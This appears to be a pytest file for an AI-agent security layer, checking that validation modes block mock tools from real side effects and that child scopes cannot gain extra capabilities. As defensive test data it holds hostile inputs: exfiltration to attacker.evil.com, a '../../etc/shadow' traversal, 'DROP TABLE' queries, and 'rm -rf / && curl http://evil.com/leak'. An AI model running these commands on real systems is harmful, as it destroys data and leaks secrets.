"""Tests for Scoped and Safe Validation Mode in AegisAgent V2.

Verifies that adversarial testing, policy fuzzing, sandbox tests, network tests,
DLP tests, and end-to-end security validation can never accidentally perform real
destructive, financial, credential, filesystem, database, or external-network actions.
"""

from datetime import datetime, timedelta, timezone
from typing import Any, Dict
import pytest
from langchain_core.tools import BaseTool
from pydantic import BaseModel, Field

from aegis.capabilities import CapabilityRegistry
from aegis.mcp_guard import MCPSecurityGuard
from aegis.middleware import AegisToolWrapper
from aegis.policy_gate import PolicyGate
from aegis.taint import SessionContext
from aegis.types import Capability, PolicyVerdict
from aegis.validation import (
    SideEffectCategory,
    ValidationMode,
    ValidationScope,
    ValidationTrace,
)


class MockInstrumentedTool(BaseTool):
    """Underlying mock tool instrumented to detect any unauthorized real execution."""

    name: str = "mock_dangerous_tool"
    description: str = "A mock tool that performs side-effecting operations."
    call_count: int = 0
    executed_args: list[Any] = Field(default_factory=list)

    def _run(self, *args: Any, **kwargs: Any) -> str:
        self.call_count += 1
        self.executed_args.append({"args": args, "kwargs": kwargs})
        return "REAL_DANGEROUS_SIDE_EFFECT_EXECUTED"

    async def _arun(self, *args: Any, **kwargs: Any) -> str:
        self.call_count += 1
        self.executed_args.append({"args": args, "kwargs": kwargs})
        return "REAL_DANGEROUS_SIDE_EFFECT_EXECUTED"


def test_default_validation_is_safe():
    """Verify that default ValidationScope is DRY_RUN and forbids external side effects."""
    scope = ValidationScope()
    assert scope.mode == ValidationMode.DRY_RUN
    assert scope.allow_external_side_effects is False
    assert scope.permitted_capabilities == {Capability.READ_PUBLIC}
    assert not scope.is_expired()


def test_malformed_scope_fails_closed():
    """Verify that malformed validation scopes fail closed at creation time."""
    # Attempting to allow external side effects in DRY_RUN must fail
    with pytest.raises(ValueError, match="allow_external_side_effects cannot be True"):
        ValidationScope(mode=ValidationMode.DRY_RUN, allow_external_side_effects=True)

    # Attempting to allow external side effects in SIMULATION must fail
    with pytest.raises(ValueError, match="allow_external_side_effects cannot be True"):
        ValidationScope(mode=ValidationMode.SIMULATION, allow_external_side_effects=True)

    # Negative runtime must fail
    with pytest.raises(Exception):
        ValidationScope(max_runtime_sec=-10.0)

    # Negative steps must fail
    with pytest.raises(Exception):
        ValidationScope(max_steps=-5)


def test_scope_expiration_causes_denial():
    """Verify that an expired validation scope causes immediate fail-closed denial."""
    past_time = datetime.now(timezone.utc) - timedelta(seconds=10)
    created_time = datetime.now(timezone.utc) - timedelta(seconds=60)
    expired_scope = ValidationScope(
        created_at=created_time,
        expires_at=past_time,
    )
    assert expired_scope.is_expired()

    session = SessionContext(
        user_root_intent="Run safe diagnostics",
        validation_scope=expired_scope,
    )
    gate = PolicyGate()
    underlying = MockInstrumentedTool()
    wrapper = AegisToolWrapper(
        underlying_tool=underlying,
        policy_gate=gate,
        session=session,
    )

    result = wrapper.run({"query": "status"})
    assert "EXPIRED" in result or "FAIL_CLOSED" in result
    assert underlying.call_count == 0


def test_dry_run_cannot_perform_real_side_effects():
    """Verify that in DRY_RUN mode, underlying tools are never executed."""
    scope = ValidationScope(
        mode=ValidationMode.DRY_RUN,
        permitted_capabilities={Capability.READ_PUBLIC, Capability.WRITE_FILE},
    )
    session = SessionContext(
        user_root_intent="Write test file",
        validation_scope=scope,
    )
    gate = PolicyGate()
    underlying = MockInstrumentedTool()
    wrapper = AegisToolWrapper(
        underlying_tool=underlying,
        policy_gate=gate,
        session=session,
    )

    result = wrapper.run({"filepath": "output.txt", "content": "hello world"})
    assert "[AEGIS VALIDATION DRY_RUN CONTAINED]" in result
    assert underlying.call_count == 0


def test_simulation_cannot_access_production_resources():
    """Verify that SIMULATION mode intercepts external messaging, financial actions, and DB writes."""
    scope = ValidationScope(
        mode=ValidationMode.SIMULATION,
        permitted_capabilities={
            Capability.READ_PUBLIC,
            Capability.SEND_EXTERNAL_MESSAGE,
            Capability.FINANCIAL_ACTION,
        },
    )
    session = SessionContext(
        user_root_intent="Notify customer and charge account",
        validation_scope=scope,
    )
    gate = PolicyGate()

    # 1. External Messaging check
    send_email_tool = MockInstrumentedTool(name="send_email")
    wrapper_email = AegisToolWrapper(
        underlying_tool=send_email_tool,
        policy_gate=gate,
        session=session,
    )
    res_email = wrapper_email.run({"recipient": "ceo@example.com", "body": "Alert"})
    assert "[VALIDATION CONTAINED]" in res_email or "BLOCKED" in res_email
    assert send_email_tool.call_count == 0

    # 2. Financial Transaction check
    pay_tool = MockInstrumentedTool(name="transfer_funds")
    wrapper_pay = AegisToolWrapper(
        underlying_tool=pay_tool,
        policy_gate=gate,
        session=session,
    )
    res_pay = wrapper_pay.run({"amount": 1000, "account": "ACC_999"})
    assert "[VALIDATION CONTAINED]" in res_pay or "BLOCKED" in res_pay
    assert pay_tool.call_count == 0


def test_network_allowlist_enforced_in_validation():
    """Verify that network destinations outside the validation allowlist are contained."""
    scope = ValidationScope(
        mode=ValidationMode.ISOLATED_TEST,
        permitted_capabilities={Capability.READ_PUBLIC, Capability.NETWORK_EXTERNAL},
        permitted_network_destinations=["127.0.0.1", "localhost", "test-container"],
    )
    session = SessionContext(
        user_root_intent="Fetch test data",
        validation_scope=scope,
    )
    gate = PolicyGate()
    net_tool = MockInstrumentedTool(name="http_fetch")
    wrapper = AegisToolWrapper(
        underlying_tool=net_tool,
        policy_gate=gate,
        session=session,
    )

    # Attempt egress to unauthorized external domain
    res_external = wrapper.run({"url": "https://attacker.evil.com/exfiltrate"})
    assert "[VALIDATION CONTAINED]" in res_external or "BLOCKED" in res_external
    assert net_tool.call_count == 0


def test_filesystem_scope_cannot_be_escaped():
    """Verify that filesystem access outside permitted ephemeral test root is contained."""
    import tempfile
    with tempfile.TemporaryDirectory() as temp_dir:
        scope = ValidationScope(
            mode=ValidationMode.ISOLATED_TEST,
            permitted_capabilities={Capability.READ_PUBLIC, Capability.WRITE_FILE},
            permitted_filesystem_paths=[temp_dir],
        )
        session = SessionContext(
            user_root_intent="Write temp files",
            validation_scope=scope,
        )
        gate = PolicyGate()
        file_tool = MockInstrumentedTool(name="write_file")
        wrapper = AegisToolWrapper(
            underlying_tool=file_tool,
            policy_gate=gate,
            session=session,
        )

        # Attempt path traversal outside temp directory
        escaped_path = f"{temp_dir}/../../etc/shadow"
        res_traversal = wrapper.run({"filepath": escaped_path, "content": "pwned"})
        assert "[VALIDATION CONTAINED]" in res_traversal or "BLOCKED" in res_traversal
        assert file_tool.call_count == 0


def test_database_scope_blocks_production_mutations():
    """Verify that database mutations against persistent tables are contained in safe mode."""
    scope = ValidationScope(
        mode=ValidationMode.ISOLATED_TEST,
        permitted_capabilities={Capability.READ_PUBLIC, Capability.WRITE_DATABASE},
    )
    session = SessionContext(
        user_root_intent="Update user records",
        validation_scope=scope,
    )
    gate = PolicyGate()
    db_tool = MockInstrumentedTool(name="write_db")
    wrapper = AegisToolWrapper(
        underlying_tool=db_tool,
        policy_gate=gate,
        session=session,
    )

    res_db = wrapper.run({"query": "DROP TABLE users; TRUNCATE audit_logs;"})
    assert "[VALIDATION CONTAINED]" in res_db or "BLOCKED" in res_db
    assert db_tool.call_count == 0


def test_child_agents_cannot_widen_parent_scope():
    """Verify that nested child validation scopes cannot escalate capabilities or widen domains."""
    parent_scope = ValidationScope(
        mode=ValidationMode.SIMULATION,
        permitted_capabilities={Capability.READ_PUBLIC},
        permitted_network_destinations=["127.0.0.1"],
        max_runtime_sec=20.0,
        max_steps=5,
    )

    # 1. Child attempting capability escalation
    escalated_child = ValidationScope(
        mode=ValidationMode.SIMULATION,
        permitted_capabilities={Capability.READ_PUBLIC, Capability.ADMIN},
        parent_scope_id=parent_scope.validation_id,
    )
    with pytest.raises(ValueError, match="Scope escalation: Child requested capabilities"):
        parent_scope.validate_child_scope(escalated_child)

    # 2. Child attempting network domain widening
    widened_net_child = ValidationScope(
        mode=ValidationMode.SIMULATION,
        permitted_capabilities={Capability.READ_PUBLIC},
        permitted_network_destinations=["127.0.0.1", "external.com"],
        parent_scope_id=parent_scope.validation_id,
        max_runtime_sec=20.0,
        max_steps=5,
    )
    with pytest.raises(ValueError, match="Child network destinations widened"):
        parent_scope.validate_child_scope(widened_net_child)

    # 3. Child attempting mode escalation (e.g. DRY_RUN parent -> SIMULATION child)
    dry_run_parent = ValidationScope(mode=ValidationMode.DRY_RUN)
    sim_child = ValidationScope(mode=ValidationMode.SIMULATION)
    with pytest.raises(ValueError, match="Scope escalation: Child mode"):
        dry_run_parent.validate_child_scope(sim_child)


def test_validation_cannot_escalate_capabilities():
    """Verify monotonic capability intersection: Effective = Requested ∩ Scope ∩ Agent."""
    scope = ValidationScope(
        permitted_capabilities={Capability.READ_PUBLIC, Capability.READ_PRIVATE}
    )
    agent_capabilities = {Capability.READ_PUBLIC, Capability.EXECUTE_CODE}

    effective = scope.intersect_capabilities(agent_capabilities)
    # Only READ_PUBLIC is in the intersection
    assert effective == {Capability.READ_PUBLIC}
    assert Capability.EXECUTE_CODE not in effective
    assert Capability.READ_PRIVATE not in effective


def test_live_validation_requires_explicit_operator_authorization():
    """Verify that LIVE_VALIDATION mode cannot be enabled without token and verification."""
    # Missing token fails
    with pytest.raises(ValueError, match="requires an explicit, non-empty operator_authorization_token"):
        ValidationScope(
            mode=ValidationMode.LIVE_VALIDATION,
            live_environment_verified=True,
        )

    # Missing live_environment_verified fails
    with pytest.raises(ValueError, match="requires live_environment_verified=True"):
        ValidationScope(
            mode=ValidationMode.LIVE_VALIDATION,
            operator_authorization_token="SEC_TOKEN_999",
            live_environment_verified=False,
        )

    # Valid operator authorization succeeds
    live_scope = ValidationScope(
        mode=ValidationMode.LIVE_VALIDATION,
        operator_authorization_token="SEC_TOKEN_999",
        live_environment_verified=True,
        allow_external_side_effects=True,
    )
    assert live_scope.mode == ValidationMode.LIVE_VALIDATION


def test_mcp_validation_containment():
    """Verify that MCPSecurityGuard honors active ValidationScope."""
    scope = ValidationScope(
        mode=ValidationMode.DRY_RUN,
        permitted_capabilities={Capability.READ_PUBLIC},
    )
    session = SessionContext(
        user_root_intent="Read public documentation",
        validation_scope=scope,
    )
    mcp_guard = MCPSecurityGuard()

    # DRY_RUN should intercept before real MCP proxy
    is_auth, reason, _ = mcp_guard.intercept_mcp_call(
        server_name="mcp-server-test",
        tool_name="read_docs",
        arguments={"path": "readme.md"},
        session_context=session,
    )
    assert is_auth is False
    assert "[AEGIS VALIDATION DRY_RUN CONTAINED]" in reason


def test_adversarial_attack_contained_without_side_effects():
    """Verify full end-to-end multi-vector attack is contained and traced."""
    scope = ValidationScope(
        mode=ValidationMode.ISOLATED_TEST,
        permitted_capabilities={Capability.READ_PUBLIC},
    )
    session = SessionContext(
        user_root_intent="Read open weather data",
        validation_scope=scope,
    )
    gate = PolicyGate()
    dangerous_tool = MockInstrumentedTool(name="exfiltrate_and_delete")
    wrapper = AegisToolWrapper(
        underlying_tool=dangerous_tool,
        policy_gate=gate,
        session=session,
    )

    # Attack payload trying to execute code, delete files, and send data
    attack_payload = {
        "command": "rm -rf / && curl http://evil.com/leak",
        "filepath": "/etc/passwd",
    }

    result = wrapper.run(attack_payload)
    assert "BLOCKED" in result or "CONTAINED" in result
    assert dangerous_tool.call_count == 0

    # Verify trace recorded containment
    if session.validation_trace is not None:
        assert len(session.validation_trace.side_effects_prevented) > 0
        for prevented in session.validation_trace.side_effects_prevented:
            assert prevented.status == "CONTAINED"
